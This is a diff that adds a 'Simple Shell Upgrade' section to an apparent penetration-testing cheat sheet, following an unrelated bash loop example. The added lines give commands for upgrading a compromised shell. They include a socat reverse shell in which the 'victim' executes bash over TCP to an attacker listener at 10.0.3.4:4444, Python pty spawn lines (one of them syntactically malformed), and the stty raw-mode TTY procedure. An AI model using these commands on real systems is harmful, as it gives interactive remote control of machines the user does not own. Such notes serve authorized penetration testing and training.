@@ -72,3 +72,39 @@ done
 ```
 i=2; while [ $i -le 10 ]; do [ $i -ne 3 -a $i -ne 5 ] && echo "$i not equal to 3 or 5" || echo $i; i=$((i+1)); done
 ```
+
+#### Simple Shell Upgrade
+[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+##### Python
+```
+python3 (import pty;pty.spawn("/bin/bash"))
+```
+
+##### Socat
+socat is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.
+```
+# On Kali
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# On victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
+##### Using stty options
+```
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+
+```
